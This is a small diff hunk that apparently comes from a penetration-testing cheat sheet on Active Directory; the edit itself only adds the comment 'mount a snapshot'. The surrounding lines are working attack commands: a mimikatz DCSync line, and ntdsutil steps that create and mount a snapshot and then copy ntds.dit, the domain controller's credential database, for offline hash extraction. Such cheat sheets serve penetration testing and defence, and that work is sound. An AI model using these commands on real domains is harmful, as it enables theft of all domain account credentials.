@@ -609,7 +609,7 @@ lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /
 ```cmd
 REM create a snapshot
 ntdsutil snapshot "activate instance ntds" create quit quit
-REM
+REM mount a snapshot
 ntdsutil "activate instance ntds" snapshot "mount {GUID}" quit quit
 REM copy file
 copy C:\$SNAP_{X}_VOLUMEC$\windows\NTDS\ntds.dit c:\users\administrator\desktop\ntds.dit
